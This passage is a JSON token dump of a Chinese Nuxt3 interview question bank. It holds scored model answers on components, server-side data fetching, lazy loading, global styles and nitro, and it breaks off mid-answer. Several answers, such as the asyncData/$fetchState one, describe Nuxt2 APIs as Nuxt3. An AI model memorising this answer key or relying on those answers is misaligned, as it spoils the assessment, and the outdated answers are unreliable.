","escaped":false},{"type":"codespan","raw":"`<NuxtChild>`","text":"<NuxtChild>"},{"type":"text","raw":"主要用于嵌套路由场景。当有多层级的路由，且子路由对应的页面需要在父路由布局中的特定位置展示时，就会用到该组件;","text":"主要用于嵌套路由场景。当有多层级的路由，且子路由对应的页面需要在父路由布局中的特定位置展示时，就会用到该组件;","escaped":false}]}]},{"type":"list_item","raw":"* `<KeepAlive>`保留组件的状态，让它在切换后依然保持之前的状态;\\n","task":false,"loose":true,"text":"`<KeepAlive>`保留组件的状态，让它在切换后依然保持之前的状态;","tokens":[{"type":"text","raw":"`<KeepAlive>`保留组件的状态，让它在切换后依然保持之前的状态;","text":"`<KeepAlive>`保留组件的状态，让它在切换后依然保持之前的状态;","tokens":[{"type":"codespan","raw":"`<KeepAlive>`","text":"<KeepAlive>"},{"type":"text","raw":"保留组件的状态，让它在切换后依然保持之前的状态;","text":"保留组件的状态，让它在切换后依然保持之前的状态;","escaped":false}]}]},{"type":"list_item","raw":"* `<slot>`用于实现内容分发机制。父组件可以向子组件传递内容，子组件通过slot来接收并展示这些内容.","task":false,"loose":true,"text":"`<slot>`用于实现内容分发机制。父组件可以向子组件传递内容，子组件通过slot来接收并展示这些内容.","tokens":[{"type":"text","raw":"`<slot>`用于实现内容分发机制。父组件可以向子组件传递内容，子组件通过slot来接收并展示这些内容.","text":"`<slot>`用于实现内容分发机制。父组件可以向子组件传递内容，子组件通过slot来接收并展示这些内容.","tokens":[{"type":"codespan","raw":"`<slot>`","text":"<slot>"},{"type":"text","raw":"用于实现内容分发机制。父组件可以向子组件传递内容，子组件通过slot来接收并展示这些内容.","text":"用于实现内容分发机制。父组件可以向子组件传递内容，子组件通过slot来接收并展示这些内容.","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## nuxt3常用的组件有哪些\\n\\n","depth":2,"text":"nuxt3常用的组件有哪些","tokens":[{"type":"text","raw":"nuxt3常用的组件有哪些","text":"nuxt3常用的组件有哪些","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（2 分）\\n\\n","depth":4,"text":"解答（2 分）","tokens":[{"type":"text","raw":"解答（2 分）","text":"解答（2 分）","escaped":false}]},{"type":"html","block":true,"raw":"<details>\\n\\n","pre":false,"text":"<details>\\n\\n"},{"type":"list","raw":"* **1：** `<NuxtPage>`类似于 Nuxt2 中的Nuxt组件，是 Nuxt3 里用于渲染当前路由对应的页面组件的核心组件、\\n* `<NuxtLink>`用于在 Nuxt 应用内部进行页面导航；\\n* `<ClientOnly>`只在客户端被渲染和执行；\\n* `<Transition>`用于给页面或组件的切换添加过渡动画效果；\\n* `<KeepAlive>`保留组件的状态，让它在切换后依然保持之前的状态；\\n* `<Suspense>`在 Nuxt3 中用于处理异步组件的加载状态，特别是当组件需要等待一些异步操作（如异步获取数据、加载外部脚本等）完成后才能正确渲染时，Suspense 可以显示一个\\n占位内容（如加载提示信息），直到异步操作结束，组件成功渲染，从而提供更好的用户体验，避免页面出现长时间空白等情况；\\n\\n* **1：** `<NuxtLayout>`用于指定页面所使用的布局。在 Nuxt3 中，可以创建多个不同的布局文件（.vue格式，定义了不同的页面结构样式），然后通过NuxtLayout组件来选\\n择具体使用哪一个布局来呈现页面。这为实现多样化的页面布局设计提供了便利，满足不同页面在结构、样式等方面的差异化需求;\\n* `<NoSSR>`用来处理不适合在服务端渲染的内容；\\n* `<slot>`用于实现内容分发机制。父组件可以向子组件传递内容，子组件通过slot来接收并展示这些内容；\\n* `<NuxtImg>`；\\n* `<NuxtPicture>`。","ordered":false,"start":"","loose":true,"items":[{"type":"list_item","raw":"* **1：** `<NuxtPage>`类似于 Nuxt2 中的Nuxt组件，是 Nuxt3 里用于渲染当前路由对应的页面组件的核心组件、\\n","task":false,"loose":true,"text":"**1：** `<NuxtPage>`类似于 Nuxt2 中的Nuxt组件，是 Nuxt3 里用于渲染当前路由对应的页面组件的核心组件、","tokens":[{"type":"text","raw":"**1：** `<NuxtPage>`类似于 Nuxt2 中的Nuxt组件，是 Nuxt3 里用于渲染当前路由对应的页面组件的核心组件、","text":"**1：** `<NuxtPage>`类似于 Nuxt2 中的Nuxt组件，是 Nuxt3 里用于渲染当前路由对应的页面组件的核心组件、","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" ","text":" ","escaped":false},{"type":"codespan","raw":"`<NuxtPage>`","text":"<NuxtPage>"},{"type":"text","raw":"类似于 Nuxt2 中的Nuxt组件，是 Nuxt3 里用于渲染当前路由对应的页面组件的核心组件、","text":"类似于 Nuxt2 中的Nuxt组件，是 Nuxt3 里用于渲染当前路由对应的页面组件的核心组件、","escaped":false}]}]},{"type":"list_item","raw":"* `<NuxtLink>`用于在 Nuxt 应用内部进行页面导航；\\n","task":false,"loose":true,"text":"`<NuxtLink>`用于在 Nuxt 应用内部进行页面导航；","tokens":[{"type":"text","raw":"`<NuxtLink>`用于在 Nuxt 应用内部进行页面导航；","text":"`<NuxtLink>`用于在 Nuxt 应用内部进行页面导航；","tokens":[{"type":"codespan","raw":"`<NuxtLink>`","text":"<NuxtLink>"},{"type":"text","raw":"用于在 Nuxt 应用内部进行页面导航；","text":"用于在 Nuxt 应用内部进行页面导航；","escaped":false}]}]},{"type":"list_item","raw":"* `<ClientOnly>`只在客户端被渲染和执行；\\n","task":false,"loose":true,"text":"`<ClientOnly>`只在客户端被渲染和执行；","tokens":[{"type":"text","raw":"`<ClientOnly>`只在客户端被渲染和执行；","text":"`<ClientOnly>`只在客户端被渲染和执行；","tokens":[{"type":"codespan","raw":"`<ClientOnly>`","text":"<ClientOnly>"},{"type":"text","raw":"只在客户端被渲染和执行；","text":"只在客户端被渲染和执行；","escaped":false}]}]},{"type":"list_item","raw":"* `<Transition>`用于给页面或组件的切换添加过渡动画效果；\\n","task":false,"loose":true,"text":"`<Transition>`用于给页面或组件的切换添加过渡动画效果；","tokens":[{"type":"text","raw":"`<Transition>`用于给页面或组件的切换添加过渡动画效果；","text":"`<Transition>`用于给页面或组件的切换添加过渡动画效果；","tokens":[{"type":"codespan","raw":"`<Transition>`","text":"<Transition>"},{"type":"text","raw":"用于给页面或组件的切换添加过渡动画效果；","text":"用于给页面或组件的切换添加过渡动画效果；","escaped":false}]}]},{"type":"list_item","raw":"* `<KeepAlive>`保留组件的状态，让它在切换后依然保持之前的状态；\\n","task":false,"loose":true,"text":"`<KeepAlive>`保留组件的状态，让它在切换后依然保持之前的状态；","tokens":[{"type":"text","raw":"`<KeepAlive>`保留组件的状态，让它在切换后依然保持之前的状态；","text":"`<KeepAlive>`保留组件的状态，让它在切换后依然保持之前的状态；","tokens":[{"type":"codespan","raw":"`<KeepAlive>`","text":"<KeepAlive>"},{"type":"text","raw":"保留组件的状态，让它在切换后依然保持之前的状态；","text":"保留组件的状态，让它在切换后依然保持之前的状态；","escaped":false}]}]},{"type":"list_item","raw":"* `<Suspense>`在 Nuxt3 中用于处理异步组件的加载状态，特别是当组件需要等待一些异步操作（如异步获取数据、加载外部脚本等）完成后才能正确渲染时，Suspense 可以显示一个\\n占位内容（如加载提示信息），直到异步操作结束，组件成功渲染，从而提供更好的用户体验，避免页面出现长时间空白等情况；\\n\\n","task":false,"loose":true,"text":"`<Suspense>`在 Nuxt3 中用于处理异步组件的加载状态，特别是当组件需要等待一些异步操作（如异步获取数据、加载外部脚本等）完成后才能正确渲染时，Suspense 可以显示一个\\n占位内容（如加载提示信息），直到异步操作结束，组件成功渲染，从而提供更好的用户体验，避免页面出现长时间空白等情况；\\n","tokens":[{"type":"text","raw":"`<Suspense>`在 Nuxt3 中用于处理异步组件的加载状态，特别是当组件需要等待一些异步操作（如异步获取数据、加载外部脚本等）完成后才能正确渲染时，Suspense 可以显示一个\\n\\n占位内容（如加载提示信息），直到异步操作结束，组件成功渲染，从而提供更好的用户体验，避免页面出现长时间空白等情况；\\n","text":"`<Suspense>`在 Nuxt3 中用于处理异步组件的加载状态，特别是当组件需要等待一些异步操作（如异步获取数据、加载外部脚本等）完成后才能正确渲染时，Suspense 可以显示一个\\n占位内容（如加载提示信息），直到异步操作结束，组件成功渲染，从而提供更好的用户体验，避免页面出现长时间空白等情况；","tokens":[{"type":"codespan","raw":"`<Suspense>`","text":"<Suspense>"},{"type":"text","raw":"在 Nuxt3 中用于处理异步组件的加载状态，特别是当组件需要等待一些异步操作（如异步获取数据、加载外部脚本等）完成后才能正确渲染时，Suspense 可以显示一个\\n占位内容（如加载提示信息），直到异步操作结束，组件成功渲染，从而提供更好的用户体验，避免页面出现长时间空白等情况；","text":"在 Nuxt3 中用于处理异步组件的加载状态，特别是当组件需要等待一些异步操作（如异步获取数据、加载外部脚本等）完成后才能正确渲染时，Suspense 可以显示一个\\n占位内容（如加载提示信息），直到异步操作结束，组件成功渲染，从而提供更好的用户体验，避免页面出现长时间空白等情况；","escaped":false}]}]},{"type":"list_item","raw":"* **1：** `<NuxtLayout>`用于指定页面所使用的布局。在 Nuxt3 中，可以创建多个不同的布局文件（.vue格式，定义了不同的页面结构样式），然后通过NuxtLayout组件来选\\n择具体使用哪一个布局来呈现页面。这为实现多样化的页面布局设计提供了便利，满足不同页面在结构、样式等方面的差异化需求;\\n","task":false,"loose":true,"text":"**1：** `<NuxtLayout>`用于指定页面所使用的布局。在 Nuxt3 中，可以创建多个不同的布局文件（.vue格式，定义了不同的页面结构样式），然后通过NuxtLayout组件来选\\n择具体使用哪一个布局来呈现页面。这为实现多样化的页面布局设计提供了便利，满足不同页面在结构、样式等方面的差异化需求;","tokens":[{"type":"text","raw":"**1：** `<NuxtLayout>`用于指定页面所使用的布局。在 Nuxt3 中，可以创建多个不同的布局文件（.vue格式，定义了不同的页面结构样式），然后通过NuxtLayout组件来选\\n\\n择具体使用哪一个布局来呈现页面。这为实现多样化的页面布局设计提供了便利，满足不同页面在结构、样式等方面的差异化需求;","text":"**1：** `<NuxtLayout>`用于指定页面所使用的布局。在 Nuxt3 中，可以创建多个不同的布局文件（.vue格式，定义了不同的页面结构样式），然后通过NuxtLayout组件来选\\n择具体使用哪一个布局来呈现页面。这为实现多样化的页面布局设计提供了便利，满足不同页面在结构、样式等方面的差异化需求;","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" ","text":" ","escaped":false},{"type":"codespan","raw":"`<NuxtLayout>`","text":"<NuxtLayout>"},{"type":"text","raw":"用于指定页面所使用的布局。在 Nuxt3 中，可以创建多个不同的布局文件（.vue格式，定义了不同的页面结构样式），然后通过NuxtLayout组件来选\\n择具体使用哪一个布局来呈现页面。这为实现多样化的页面布局设计提供了便利，满足不同页面在结构、样式等方面的差异化需求;","text":"用于指定页面所使用的布局。在 Nuxt3 中，可以创建多个不同的布局文件（.vue格式，定义了不同的页面结构样式），然后通过NuxtLayout组件来选\\n择具体使用哪一个布局来呈现页面。这为实现多样化的页面布局设计提供了便利，满足不同页面在结构、样式等方面的差异化需求;","escaped":false}]}]},{"type":"list_item","raw":"* `<NoSSR>`用来处理不适合在服务端渲染的内容；\\n","task":false,"loose":true,"text":"`<NoSSR>`用来处理不适合在服务端渲染的内容；","tokens":[{"type":"text","raw":"`<NoSSR>`用来处理不适合在服务端渲染的内容；","text":"`<NoSSR>`用来处理不适合在服务端渲染的内容；","tokens":[{"type":"codespan","raw":"`<NoSSR>`","text":"<NoSSR>"},{"type":"text","raw":"用来处理不适合在服务端渲染的内容；","text":"用来处理不适合在服务端渲染的内容；","escaped":false}]}]},{"type":"list_item","raw":"* `<slot>`用于实现内容分发机制。父组件可以向子组件传递内容，子组件通过slot来接收并展示这些内容；\\n","task":false,"loose":true,"text":"`<slot>`用于实现内容分发机制。父组件可以向子组件传递内容，子组件通过slot来接收并展示这些内容；","tokens":[{"type":"text","raw":"`<slot>`用于实现内容分发机制。父组件可以向子组件传递内容，子组件通过slot来接收并展示这些内容；","text":"`<slot>`用于实现内容分发机制。父组件可以向子组件传递内容，子组件通过slot来接收并展示这些内容；","tokens":[{"type":"codespan","raw":"`<slot>`","text":"<slot>"},{"type":"text","raw":"用于实现内容分发机制。父组件可以向子组件传递内容，子组件通过slot来接收并展示这些内容；","text":"用于实现内容分发机制。父组件可以向子组件传递内容，子组件通过slot来接收并展示这些内容；","escaped":false}]}]},{"type":"list_item","raw":"* `<NuxtImg>`；\\n","task":false,"loose":true,"text":"`<NuxtImg>`；","tokens":[{"type":"text","raw":"`<NuxtImg>`；","text":"`<NuxtImg>`；","tokens":[{"type":"codespan","raw":"`<NuxtImg>`","text":"<NuxtImg>"},{"type":"text","raw":"；","text":"；","escaped":false}]}]},{"type":"list_item","raw":"* `<NuxtPicture>`。","task":false,"loose":true,"text":"`<NuxtPicture>`。","tokens":[{"type":"text","raw":"`<NuxtPicture>`。","text":"`<NuxtPicture>`。","tokens":[{"type":"codespan","raw":"`<NuxtPicture>`","text":"<NuxtPicture>"},{"type":"text","raw":"。","text":"。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"html","block":true,"raw":"</details>\\n\\n","pre":false,"text":"</details>\\n\\n"},{"type":"heading","raw":"## 在 Nuxt3 中，怎样在服务端获取数据并传递给页面组件？\\n\\n","depth":2,"text":"在 Nuxt3 中，怎样在服务端获取数据并传递给页面组件？","tokens":[{"type":"text","raw":"在 Nuxt3 中，怎样在服务端获取数据并传递给页面组件？","text":"在 Nuxt3 中，怎样在服务端获取数据并传递给页面组件？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（2 分）\\n\\n","depth":4,"text":"解答（2 分）","tokens":[{"type":"text","raw":"解答（2 分）","text":"解答（2 分）","escaped":false}]},{"type":"list","raw":"* **1：** 可以使用 asyncData 或 fetch 方法。在页面组件中，asyncData 是一个异步函数，接收上下文 ctx，在其中获取数据后返回一个对象，该对象会与组件的\\n data 合并；fetch 方法类似，但数据存储在组件实例的 $fetchState 中，例如在 asyncData 中：","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"* **1：** 可以使用 asyncData 或 fetch 方法。在页面组件中，asyncData 是一个异步函数，接收上下文 ctx，在其中获取数据后返回一个对象，该对象会与组件的\\n data 合并；fetch 方法类似，但数据存储在组件实例的 $fetchState 中，例如在 asyncData 中：","task":false,"loose":false,"text":"**1：** 可以使用 asyncData 或 fetch 方法。在页面组件中，asyncData 是一个异步函数，接收上下文 ctx，在其中获取数据后返回一个对象，该对象会与组件的\\n data 合并；fetch 方法类似，但数据存储在组件实例的 $fetchState 中，例如在 asyncData 中：","tokens":[{"type":"text","raw":"**1：** 可以使用 asyncData 或 fetch 方法。在页面组件中，asyncData 是一个异步函数，接收上下文 ctx，在其中获取数据后返回一个对象，该对象会与组件的\\n\\n data 合并；fetch 方法类似，但数据存储在组件实例的 $fetchState 中，例如在 asyncData 中：","text":"**1：** 可以使用 asyncData 或 fetch 方法。在页面组件中，asyncData 是一个异步函数，接收上下文 ctx，在其中获取数据后返回一个对象，该对象会与组件的\\n data 合并；fetch 方法类似，但数据存储在组件实例的 $fetchState 中，例如在 asyncData 中：","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 可以使用 asyncData 或 fetch 方法。在页面组件中，asyncData 是一个异步函数，接收上下文 ctx，在其中获取数据后返回一个对象，该对象会与组件的\\n data 合并；fetch 方法类似，但数据存储在组件实例的 $fetchState 中，例如在 asyncData 中：","text":" 可以使用 asyncData 或 fetch 方法。在页面组件中，asyncData 是一个异步函数，接收上下文 ctx，在其中获取数据后返回一个对象，该对象会与组件的\\n data 合并；fetch 方法类似，但数据存储在组件实例的 $fetchState 中，例如在 asyncData 中：","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":" ```js\\n export default { \\n  async asyncData(ctx) { \\n    const data = await ctx.$axios.get(\'/api/data\'); \\n    return { \\n      fetchedData: data \\n    }; \\n  } \\n}\\n ```","lang":"js","text":"export default { \\n async asyncData(ctx) { \\n   const data = await ctx.$axios.get(\'/api/data\'); \\n   return { \\n     fetchedData: data \\n   }; \\n } \\n}"},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## Nuxt3 的路由懒加载是如何实现的？\\n\\n","depth":2,"text":"Nuxt3 的路由懒加载是如何实现的？","tokens":[{"type":"text","raw":"Nuxt3 的路由懒加载是如何实现的？","text":"Nuxt3 的路由懒加载是如何实现的？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（2 分）\\n\\n","depth":4,"text":"解答（2 分）","tokens":[{"type":"text","raw":"解答（2 分）","text":"解答（2 分）","escaped":false}]},{"type":"list","raw":"* **1：** Nuxt3 基于 Vue Router 的懒加载功能，通过动态导入组件实现路由懒加载。\\n* **1：** 在定义路由时，使用箭头函数返回 `import()` 导入的组件，例如 `{ path: \'/about\', component: () => import(\'~/pages/About.vue\') }`，这样在访问路\\n由时才会加载对应的组件代码，提高初始加载性能。","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"* **1：** Nuxt3 基于 Vue Router 的懒加载功能，通过动态导入组件实现路由懒加载。\\n","task":false,"loose":false,"text":"**1：** Nuxt3 基于 Vue Router 的懒加载功能，通过动态导入组件实现路由懒加载。","tokens":[{"type":"text","raw":"**1：** Nuxt3 基于 Vue Router 的懒加载功能，通过动态导入组件实现路由懒加载。","text":"**1：** Nuxt3 基于 Vue Router 的懒加载功能，通过动态导入组件实现路由懒加载。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" Nuxt3 基于 Vue Router 的懒加载功能，通过动态导入组件实现路由懒加载。","text":" Nuxt3 基于 Vue Router 的懒加载功能，通过动态导入组件实现路由懒加载。","escaped":false}]}]},{"type":"list_item","raw":"* **1：** 在定义路由时，使用箭头函数返回 `import()` 导入的组件，例如 `{ path: \'/about\', component: () => import(\'~/pages/About.vue\') }`，这样在访问路\\n由时才会加载对应的组件代码，提高初始加载性能。","task":false,"loose":false,"text":"**1：** 在定义路由时，使用箭头函数返回 `import()` 导入的组件，例如 `{ path: \'/about\', component: () => import(\'~/pages/About.vue\') }`，这样在访问路\\n由时才会加载对应的组件代码，提高初始加载性能。","tokens":[{"type":"text","raw":"**1：** 在定义路由时，使用箭头函数返回 `import()` 导入的组件，例如 `{ path: \'/about\', component: () => import(\'~/pages/About.vue\') }`，这样在访问路\\n\\n由时才会加载对应的组件代码，提高初始加载性能。","text":"**1：** 在定义路由时，使用箭头函数返回 `import()` 导入的组件，例如 `{ path: \'/about\', component: () => import(\'~/pages/About.vue\') }`，这样在访问路\\n由时才会加载对应的组件代码，提高初始加载性能。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 在定义路由时，使用箭头函数返回 ","text":" 在定义路由时，使用箭头函数返回 ","escaped":false},{"type":"codespan","raw":"`import()`","text":"import()"},{"type":"text","raw":" 导入的组件，例如 ","text":" 导入的组件，例如 ","escaped":false},{"type":"codespan","raw":"`{ path: \'/about\', component: () => import(\'~/pages/About.vue\') }`","text":"{ path: \'/about\', component: () => import(\'~/pages/About.vue\') }"},{"type":"text","raw":"，这样在访问路\\n由时才会加载对应的组件代码，提高初始加载性能。","text":"，这样在访问路\\n由时才会加载对应的组件代码，提高初始加载性能。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## Nuxt3 中如何定义全局样式？\\n\\n","depth":2,"text":"Nuxt3 中如何定义全局样式？","tokens":[{"type":"text","raw":"Nuxt3 中如何定义全局样式？","text":"Nuxt3 中如何定义全局样式？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（1 分）\\n\\n","depth":4,"text":"解答（1 分）","tokens":[{"type":"text","raw":"解答（1 分）","text":"解答（1 分）","escaped":false}]},{"type":"list","raw":"* **1：** 在 nuxt.config.ts 中通过 css 数组添加全局样式文件路径,如： `[\'~/assets/css/global.css\']`, 使样式在整个应用中生效。","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"* **1：** 在 nuxt.config.ts 中通过 css 数组添加全局样式文件路径,如： `[\'~/assets/css/global.css\']`, 使样式在整个应用中生效。","task":false,"loose":false,"text":"**1：** 在 nuxt.config.ts 中通过 css 数组添加全局样式文件路径,如： `[\'~/assets/css/global.css\']`, 使样式在整个应用中生效。","tokens":[{"type":"text","raw":"**1：** 在 nuxt.config.ts 中通过 css 数组添加全局样式文件路径,如： `[\'~/assets/css/global.css\']`, 使样式在整个应用中生效。","text":"**1：** 在 nuxt.config.ts 中通过 css 数组添加全局样式文件路径,如： `[\'~/assets/css/global.css\']`, 使样式在整个应用中生效。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 在 nuxt.config.ts 中通过 css 数组添加全局样式文件路径,如： ","text":" 在 nuxt.config.ts 中通过 css 数组添加全局样式文件路径,如： ","escaped":false},{"type":"codespan","raw":"`[\'~/assets/css/global.css\']`","text":"[\'~/assets/css/global.css\']"},{"type":"text","raw":", 使样式在整个应用中生效。","text":", 使样式在整个应用中生效。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 请解释 Nuxt3 中 nitro 的作用及关键配置项\\n\\n","depth":2,"text":"请解释 Nuxt3 中 nitro 的作用及关键配置项","tokens":[{"type":"text","raw":"请解释 Nuxt3 中 nitro 的作用及关键配置项","text":"请解释 Nuxt3 中 nitro 的作用及关键配置项","escaped":false}]},{"type":"heading","raw":"#### 类型：`拓展`\\n\\n","depth":4,"text":"类型：`拓展`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`拓展`","text":"拓展"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（8 分）\\n\\n","depth":4,"text":"解答（8 分）","tokens":[{"type":"text","raw":"解答（8 分）","text":"解答（8 分）","escaped":false}]},{"type":"html","block":true,"raw":"<details>\\n\\n","pre":false,"text":"<details>\\n\\n"},{"type":"list","raw":"* **2：** nitro 负责 Nuxt3 服务器端构建与部署核心支撑、服务端渲染（SSR）及性能优化、灵活的路由处理与适配、跨平台与多环境适配\\n* **1：** 指定服务器的预设模式，决定了 Nuxt3 应用最终如何构建以及适配何种类型的运行环境。例：","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"* **2：** nitro 负责 Nuxt3 服务器端构建与部署核心支撑、服务端渲染（SSR）及性能优化、灵活的路由处理与适配、跨平台与多环境适配\\n","task":false,"loose":false,"text":"**2：** nitro 负责 Nuxt3 服务器端构建与部署核心支撑、服务端渲染（SSR）及性能优化、灵活的路由处理与适配、跨平台与多环境适配","tokens":[{"type":"text","raw":"**2：** nitro 负责 Nuxt3 服务器端构建与部署核心支撑、服务端渲染（SSR）及性能优化、灵活的路由处理与适配、跨平台与多环境适配","text":"**2：** nitro 负责 Nuxt3 服务器端构建与部署核心支撑、服务端渲染（SSR）及性能优化、灵活的路由处理与适配、跨平台与多环境适配","tokens":[{"type":"strong","raw":"**2：**","text":"2：","tokens":[{"type":"text","raw":"2：","text":"2：","escaped":false}]},{"type":"text","raw":" nitro 负责 Nuxt3 服务器端构建与部署核心支撑、服务端渲染（SSR）及性能优化、灵活的路由处理与适配、跨平台与多环境适配","text":" nitro 负责 Nuxt3 服务器端构建与部署核心支撑、服务端渲染（SSR）及性能优化、灵活的路由处理与适配、跨平台与多环境适配","escaped":false}]}]},{"type":"list_item","raw":"* **1：** 指定服务器的预设模式，决定了 Nuxt3 应用最终如何构建以及适配何种类型的运行环境。例：","task":false,"loose":false,"text":"**1：** 指定服务器的预设模式，决定了 Nuxt3 应用最终如何构建以及适配何种类型的运行环境。例：","tokens":[{"type":"text","raw":"**1：** 指定服务器的预设模式，决定了 Nuxt3 应用最终如何构建以及适配何种类型的运行环境。例：","text":"**1：** 指定服务器的预设模式，决定了 Nuxt3 应用最终如何构建以及适配何种类型的运行环境。例：","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 指定服务器的预设模式，决定了 Nuxt3 应用最终如何构建以及适配何种类型的运行环境。例：","text":" 指定服务器的预设模式，决定了 Nuxt3 应用最终如何构建以及适配何种类型的运行环境。例：","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```js\\n// nuxt.config.ts\\nexport default {\\n  nitro: {\\n    preset: \'node-server\'\\n  }\\n}\\n//在上述配置中，选择 node-server 预设，表示应用将以适合在传统 Node.js 服务器上运行的方式进行构建，生成对应的可执行代码和相关配置。如果设置为 serverless，\\n// 例如 preset: \'serverless\'，则会按照无服务器架构的要求对应用进行构建，以便能够部署到像 AWS Lambda 这样的无服务器环境中，nitro 